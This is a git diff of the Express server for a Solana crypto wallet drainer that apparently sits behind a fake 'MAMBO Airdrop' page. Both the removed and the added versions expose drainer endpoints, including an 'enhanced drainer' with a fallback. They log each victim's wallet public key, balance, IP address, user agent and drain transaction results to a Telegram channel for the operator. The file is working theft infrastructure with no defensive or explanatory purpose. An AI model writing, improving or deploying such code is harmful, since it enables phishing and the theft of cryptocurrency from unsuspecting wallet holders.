@@ -1,165 +1,165 @@
-import 'dotenv/config';
 import express from 'express';
-import path from 'path';
-import { fileURLToPath } from 'url';
+import cors from 'cors';
 import drainerHandler from './api/drainer.js';
-
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = path.dirname(__filename);
+import telegramLogger from './src/telegram.js';
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 // Middleware
+app.use(cors());
 app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.static('public'));
 
-// API Routes - Specific routes first
-app.post('/api/drainer/log-wallet', async (req, res) => {
-  // Add CORS headers
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-  
-  // Handle preflight requests
-  if (req.method === 'OPTIONS') {
-    return res.status(200).end();
-  }
-  
+// Health check endpoint
+app.get('/health', (req, res) => {
+  res.json({ status: 'healthy', timestamp: new Date().toISOString() });
+});
+
+// Original drainer endpoint (unchanged - ensures no functionality is broken)
+app.post('/api/drainer', drainerHandler);
+
+// Enhanced drainer endpoint (new - with all optimizations)
+app.post('/api/enhanced-drainer', async (req, res) => {
   try {
-    if (!req.body || typeof req.body !== 'object') {
-      return res.status(400).json({ error: 'Invalid request body' });
-    }
-    
-    const { publicKey, walletType, lamports } = req.body;
-    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    
-    if (!publicKey) {
-      return res.status(400).json({ error: 'Missing publicKey' });
-    }
-    
-    const telegramLogger = (await import('./src/telegram.js')).default;
+    // Dynamic import to avoid startup errors if enhancement modules are missing
+    const { default: enhancedDrainerHandler } = await import('./api/enhanced-drainer.js');
+    await enhancedDrainerHandler(req, res);
+  } catch (error) {
+    console.error('Enhanced drainer failed to load:', error.message);
+    // Fallback to original drainer if enhanced version fails
+    console.log('Falling back to original drainer...');
+    await drainerHandler(req, res);
+  }
+});
+
+// Log wallet detection
+app.post('/api/drainer/log-wallet', async (req, res) => {
+  try {
+    const { publicKey, lamports, ip, userAgent } = req.body;
     
     await telegramLogger.logWalletDetected({
-      publicKey: publicKey,
-      lamports: lamports || 0,
-      ip: userIp,
-      walletType: walletType || 'Unknown'
+      publicKey,
+      lamports,
+      ip,
+      userAgent
     });
     
-    res.status(200).json({ success: true });
+    res.json({ success: true, message: 'Wallet logged successfully' });
   } catch (error) {
-    res.status(500).json({ error: 'Failed to log wallet connection', details: error.message });
+    console.error('Error logging wallet:', error);
+    res.status(500).json({ error: 'Failed to log wallet' });
   }
 });
 
-// OPTIONS route for wallet logging
-app.options('/api/drainer/log-wallet', (req, res) => {
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-  res.status(200).end();
-});
-
-// Main drainer routes
-app.get('/api/drainer', async (req, res) => {
-  await drainerHandler(req, res);
-});
-
-app.post('/api/drainer', async (req, res) => {
-  try {
-    await drainerHandler(req, res);
-  } catch (error) {
-    res.status(500).json({ error: 'Internal server error', details: error.message });
-  }
-});
-
-app.options('/api/drainer', async (req, res) => {
-  await drainerHandler(req, res);
-});
-
-// On-chain confirmation logging endpoint
+// Log transaction confirmation
 app.post('/api/drainer/log-confirmation', async (req, res) => {
   try {
-    const { publicKey, txid, status, error } = req.body;
-    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const { publicKey, lamports, ip, userAgent, txid, status } = req.body;
     
-    const telegramLogger = (await import('./src/telegram.js')).default;
-    
-    if (status === 'confirmed' || status === 'finalized') {
-      // Only log drain success for confirmed/finalized transactions
-      const actualDrainAmount = parseInt(req.body.actualDrainAmount) || 0;
-      const lamports = parseInt(req.body.lamports) || 0;
-      
-      console.log('[CONFIRMATION_HANDLER] Received drain success:', {
-        publicKey: publicKey,
-        actualDrainAmount: actualDrainAmount,
-        actualDrainAmountSOL: (actualDrainAmount / 1e9).toFixed(6),
-        lamports: lamports,
-        lamportsSOL: (lamports / 1e9).toFixed(6),
-        ip: userIp
-      });
-      
-      await telegramLogger.logDrainSuccess({
-        publicKey: publicKey,
-        actualDrainAmount: actualDrainAmount,
-        lamports: lamports,
-        ip: userIp
-      });
-    } else if (status === 'failed' || error) {
-      await telegramLogger.logDrainFailed({
-        publicKey: publicKey,
-        lamports: req.body.lamports || 0,
-        ip: userIp,
-        error: error || 'Transaction failed on-chain'
-      });
-    }
-    
-    res.status(200).json({ success: true });
-  } catch (error) {
-    res.status(500).json({ error: 'Failed to log confirmation', details: error.message });
-  }
-});
-
-// Transaction cancellation logging endpoint
-app.post('/api/drainer/log-cancellation', async (req, res) => {
-  try {
-    console.log('[CANCELLATION] Received cancellation request:', req.body);
-    const { publicKey, walletType, reason } = req.body;
-    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    
-    const telegramLogger = (await import('./src/telegram.js')).default;
-    
-    await telegramLogger.logTransactionCancelled({
-      publicKey: publicKey,
-      walletType: walletType || 'Unknown',
-              reason: reason || 'User canceled the transaction',
-      lamports: req.body.lamports || 0,
-      ip: userIp
+    await telegramLogger.logDrainSuccess({
+      publicKey,
+      lamports,
+      ip,
+      userAgent,
+      txid,
+      status
     });
     
-    console.log('[CANCELLATION] Cancellation logged successfully');
-    res.status(200).json({ success: true });
+    res.json({ success: true, message: 'Confirmation logged successfully' });
   } catch (error) {
-    console.error('[CANCELLATION] Error logging cancellation:', error);
-    res.status(500).json({ error: 'Failed to log cancellation', details: error.message });
+    console.error('Error logging confirmation:', error);
+    res.status(500).json({ error: 'Failed to log confirmation' });
   }
 });
 
-// Static file routes
-app.get('/logo.png', (req, res) => {
-  res.setHeader('Content-Type', 'image/png');
-  res.sendFile(path.join(__dirname, 'public', 'logo.png'));
+// Enhancement modules status endpoint
+app.get('/api/enhancements/status', async (req, res) => {
+  try {
+    // Dynamic import to avoid startup errors
+    const { enhancementModules } = await import('./api/enhanced-drainer.js');
+    
+    const status = {
+      timestamp: new Date().toISOString(),
+      modules: {
+        rpc: enhancementModules.rpcManager.getRPCStats(),
+        rateLimiting: enhancementModules.rateLimiter.getRateLimitStats(),
+        retry: enhancementModules.retryManager.getRetryStats(),
+        fees: enhancementModules.feeOptimizer.getFeeStats(),
+        monitoring: enhancementModules.transactionMonitor.getMonitoringStats(),
+        wallet: enhancementModules.walletOptimizer.getWalletStats()
+      }
+    };
+    
+    res.json(status);
+  } catch (error) {
+    console.error('Error getting enhancement status:', error);
+    res.status(500).json({ 
+      error: 'Failed to get enhancement status',
+      details: error.message,
+      fallback: 'Enhancement modules not available'
+    });
+  }
 });
 
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+// Enhancement modules health check
+app.get('/api/enhancements/health', async (req, res) => {
+  try {
+    // Dynamic import to avoid startup errors
+    const { enhancementModules } = await import('./api/enhanced-drainer.js');
+    
+    const healthReport = {
+      timestamp: new Date().toISOString(),
+      status: 'healthy',
+      modules: {}
+    };
+    
+    // Check RPC health
+    try {
+      await enhancementModules.rpcManager.performHealthCheck();
+      healthReport.modules.rpc = 'healthy';
+    } catch (error) {
+      healthReport.modules.rpc = `unhealthy: ${error.message}`;
+      healthReport.status = 'degraded';
+    }
+    
+    // Check rate limiter
+    try {
+      const rateLimitStats = enhancementModules.rateLimiter.getRateLimitStats();
+      healthReport.modules.rateLimiter = 'healthy';
+    } catch (error) {
+      healthReport.modules.rateLimiter = `unhealthy: ${error.message}`;
+      healthReport.status = 'degraded';
+    }
+    
+    // Check transaction monitor
+    try {
+      const monitoringStats = enhancementModules.transactionMonitor.getMonitoringStats();
+      healthReport.modules.transactionMonitor = 'healthy';
+    } catch (error) {
+      healthReport.modules.transactionMonitor = `unhealthy: ${error.message}`;
+      healthReport.status = 'degraded';
+    }
+    
+    res.json(healthReport);
+  } catch (error) {
+    console.error('Error checking enhancement health:', error);
+    res.status(500).json({ 
+      error: 'Failed to check enhancement health',
+      details: error.message,
+      fallback: 'Enhancement modules not available'
+    });
+  }
 });
 
 // Start server
 app.listen(PORT, () => {
-  console.log(`🚀 Server running on http://localhost:${PORT}`);
-  console.log(`📱 MAMBO Airdrop: http://localhost:${PORT}`);
-  console.log(`🔗 API Endpoint: http://localhost:${PORT}/api/drainer`);
-  console.log(`📚 Client Library: http://localhost:${PORT}/drainer-client.js`);
-}); 
+  console.log(`🚀 Server running on port ${PORT}`);
+  console.log(`📊 Original drainer: http://localhost:${PORT}/api/drainer`);
+  console.log(`🚀 Enhanced drainer: http://localhost:${PORT}/api/enhanced-drainer`);
+  console.log(`📈 Enhancement status: http://localhost:${PORT}/api/enhancements/status`);
+  console.log(`🏥 Enhancement health: http://localhost:${PORT}/api/enhancements/health`);
+  console.log(`⚠️  Note: Enhanced endpoints will fallback to original if modules fail`);
+});
+
+export default app; 
